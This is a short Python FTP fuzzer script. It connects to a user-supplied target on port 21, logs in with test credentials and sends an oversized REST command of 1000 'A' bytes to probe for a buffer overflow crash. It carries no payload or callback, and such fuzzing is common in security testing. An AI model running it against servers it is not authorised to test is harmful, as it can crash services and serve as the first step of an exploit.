#!/usr/bin/env python3
# FTP Fuzzer 
# Author Yehia Elghaly

import sys
from socket import *

print ("FTP--> Fuzzer")
print ("")
ip = input ("Enter target IP/Program: ")
port = 21

buf = b"\x41" * 1000

print ("FTP Fuzzer")

s = socket(AF_INET,SOCK_STREAM)
s.connect((ip,port))
s.recv(2000)
s.send(b"USER test\r\n")
s.recv(2000)
s.send(b"PASS test\r\n")
s.recv(2000)
s.send(b"REST "+buf+b"\r\n")
s.close()

print ("Done !!")